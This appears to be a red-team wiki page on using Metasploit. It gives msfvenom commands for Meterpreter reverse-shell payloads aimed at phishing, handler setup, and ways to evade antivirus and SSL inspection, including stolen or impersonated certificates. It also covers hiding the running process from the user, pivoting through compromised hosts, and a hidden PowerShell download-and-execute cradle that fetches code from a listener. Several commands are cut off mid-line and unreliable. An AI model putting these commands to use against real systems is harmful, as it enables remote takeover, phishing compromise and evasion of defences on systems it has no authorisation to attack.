<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Metasploit





When using msfvenom, make sure to use --smallest to make the smallest possible payload. This can help when creating phishes for VBA/Powershell scripts.



'''NOTE: Payload must be generated on the same system as the listener, otherwise Metasploit won't be able to resolve the UUID to the "friendly  name".'''
* Also, you must type <code>sessions -v</code> while in metasploit to view the resolved UUID

If you want to track metasploit payloads from phishing campaigns, you can generate a msfvenom payload using the following syntax:

```
msfvenom -p windows/meterpreter/reverse_https LHOST
```



You can read about Syringe Payload [http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html here].

Example msfvenom command to generate C shell code for execution:

```
msfvenom -p windows/meterpreter/reverse_https -f c LHOST
```



Example msfvenom command to generate Powershell shell code for execution:

```
msfvenom -p windows/meterpreter/reverse_https -f psh LHOST
```
```
msfvenom -p windows/meterpreter/reverse_https -f psh-reflection LHOST
```

Start the powershell from command prompt:
```
powershell -File C:\Location\To\Powershell.ps1
```

Location of Powershell Install Points:
```
32-bit (x86) PowerShell executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
64-bit (x64) Powershell executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
32-bit (x86) Powershell ISE executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
64-bit (x64) Powershell ISE executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
```


Example of setting up a Metasploit handler:
```
# msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set LPORT [port] 
#Use a port that is likely allowed for outgoing connections like 80, 443, 8080, 53
msf exploit(handler) > set LHOST [IP]
msf exploit(handler) > set exitonsession false
msf exploit(handler) > exploit -j -z
msf exploit(handler) > [*] Starting the payload handler...
```

Example of a meterpreter session being opened and migrating to a process:
```
msf exploit(handler) >
..Staging Native payload
Meterpreter session opened
msf exploit(handler) > sessions -l
#Find your session number
msf exploit(handler) > sessions -i [session number]
meterpreter> run post/windows/manage/migrate
#OR
meterpreter> ps
#Find the PID of the process you want to migrate to
meterpreter> migrate [PID of process]
meterpreter> background
```



Metaploit's 'multi/meterpreter/reverse_https' payload can respond to both x86 and x64 Windows callbacks:

```
# msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload multi/meterpreter/reverse_https
msf5 exploit(multi/handler) > set exitonsession false
msf5 exploit(multi/handler) > set lhost 0.0.0.0
msf5 exploit(multi/handler) > set lport 443
msf5 exploit(multi/handler) > run -j -z
```

This payload can respond to callbacks from other platforms as well, including python, java, android, and php. As of May 2020, it does not support Linux payloads. 

References:
 * https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stages/multi/meterpreter.rb#L44
 * https://github.com/rapid7/metasploit-framework/issues/10363#issuecomment-408711777




The following command sequence will generate the powershell command that will open command prompt and begin the execution of the powershell code. If one wants to have just the powershell code, then the initial part of the code will need to be removed.

```
Msfvenom –a x86 –platform windows –p windows/meterpreter/reverse_tcp LHOST
```

The above code can be further modified to omit the x86 architecture and the encoder part can be removed, but is highly suggested when working with scripts such as unicorn that are expecting a certain encoding format. Furthermore, the format can be changed to a host of different types as listed below. 

```
# msfvenom --help-formats
Executable formats
asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
psh-cmd, vba, vba-exe, vba-psh, vbs, war
Transform formats 
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, 
powershell, ps1, py, python, raw, rb, ruby, sh,
vbapplication, vbscript
```

As can be seen above, other formats such as a vba-exe or vba-psh script can be generated and inserted into a file and therefore allowing for a more discrete method of payload delivery.



If you want to bypass some AV (Symantec) you need to use a different format to generate the self-signed certificate.

You can go two ways:

* Create your self-signed certificate
* Steal someone's certificate, and turn it into a self-signed [https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation Example]

Commands:

Self-Signed Generation:

```
openssl req -x509 -newkey rsa:2048 -nodes -keyout pentest.key -days 3650 -subj "/C
```


Below no longer works as you need the SubjectAltName field.
```
openssl req -x509 -nodes -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
cat cert.pem key.pem > combined.pem
```

```
#In Metasploit while setting up a handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LPORT 443
set LHOST 192.168.1.100
set HandlerSSLCert /root/combined.pem
set exitonsession false
exploit -j -z
```

Using someone else's cert:

```
#Using Metasploit
use auxiliary/gather/impersonate_ssl
set RHOST www.google.com
run
```



If you are planning on using LetsEncrypt, make sure you are using the Full Chain Certificate, instead of just the Certificate. Some SSL Decryption toolsets (IronPort WSA Cisco) will not trust just the certificate, and since the root RA is not loaded, it won't trust the cert and just fail closed.

But using the Full Cert File (e.g., `/etc/letsencrypt/live/<INFRASTRUCTURE>/fullchain.pem`), this will allow the Decryption SSL to work and allow you to still get a shell back.

To create that certificate PEM file:

```
cat /etc/letsencrypt/live/<INFRASTRUCTURE>/fullchain.pem /etc/letsencrypt/live/<INFRASTRUCTURE>/privkey.pem > combined.pem

#metasploit> set handlersslcert /root/combined.pem
```





Prepend migrate is a flag that can be passed through generation in msfvenom. It allows for a way to have the exploit automatically migrate over to a new task after it has been executed. The objective is so that the user is not aware of their being a task running that should not be running.













Pivoting through a meterpreter session allows an attacker access to ports and protocols that are otherwise not accessible to the attacker but accessible to the victim. One primary example is proxying web traffic through a meterpreter session - allowing access to internal-only web applications. Another example is RDP - a protocol which requires a GUI and cannot be utilized by just having a command shell. 




Port Forwarding: With port forwarding, a specific local port is opening on the attackers machine, and this port is tunneled over SSH to a specific port on the meterpreter server. This has the limitation of having to be reconfigured each time a new destination host and port is required, but is necessary for certain protocols that don't play well with SOCKS (for example, RDP). 

Socks Proxy: A socks proxy takes everything thrown at it and passes it along to the target network in-tact. Once established, the attacker can change targets and even destination ports without reconfiguration - however some applications do not work with socks proxies. 



Local Attacker Workstation ----> Local Port ----> Port Forward ----> SSH Tunnel to meterpreter server ----> Local Port on Meterpreter server ----> SOCKS or Port Forward to Victim ----> Actual destination host/port

The first thing that must be set up is the tunnel for your workstation to the meterpreter server. This can be accomplished on windows using Putty or in linux using SSH



1) Put the hostname of the meterpreter server in the host name field
2) Connection->SSH->Tunnels: In the source port field, put the port that you want opened on YOUR LOCAL MACHINE that you will point your applications at.
3) Put 127.0.0.1:<port to map to> in the destination box, and select the "local" and "auto" options.

OPTIONAL:

Window->Behavior: Set the window title

Connection->Data: Set the auto-login username



Start msfconsole and initialize a reverse https listener with desired options(see Meterpreter Handler[https://wiki.snrt.io/mediawiki/Access#Metasploit_Handler] for details on this step)

Force the victim to kick back a meterpreter shell (see Powershell Payload [https://wiki.snrt.io/mediawiki/Access#Powershell_Payload] for details on this step). Consider using ackbar to generate the payload for this.

Once the session is established, access it using 
 sessions -i <session number>
, noting the session number for later

 route add <remote subnet> <its subnet mask> <session number>

You can use this module instead:

      post/multi/manage/autoroute

You must add a route for EACH DESTINATION NETWORK that you may want to make a remote connection to.

 route print 
(to verify)

FOR SOCKS:
 msf> use auxiliary/server/socks4a
 socks4a> set SRVHOST 127.0.0.1                                      
 socks4a> set SRVPORT 55555 
(this should be the same port you mapped to with putty / ssh)
 socks4a> run   

FOR Port Forwarding:



Simply point your application at the port you opened locally. For web pivoting, set your browser to use the local port as a socks proxy.
For RDP or similar applications, simply attempt to connect directly to your local port.


1. Retrieve shell from SMBRelay

      ```
      metasploit setup
      use exploit/multi/script/web_delivery # Tells msfconsole to delivery the attack over a web delivery
      set TARGET 2 # Sets the target to use powershell for the attack payload
      set URIPATH / # Sets the download path to the root
      set payload windows/meterpreter/reverse_https # Sets the paylaod to be launched
      set LHOST 0.0.0.0 # Set the local listening IP
      set LPORT 443 # Set the local listening Port
      set exitonsession false # Keep the job running even if you get a call back
      exploit -j -z # Star the exploit and run it as a job in the background
      ```
1. Metasploit will print out a command that you will need to assign to the impacket setup we will see in a moment.
      * Example:
            * ```
            powershell.exe -nop -w hidden -c IEX ((New-Object net.webclient).downloadstring('http://192.168.1.5:8080/'))
            ```
      * Currently Metasploit will give you the following command instead of the one above. This one has proven to not work 100%. Use at your own risk.
            * ```
            powershell.exe -nop -w hidden -c $x
            ```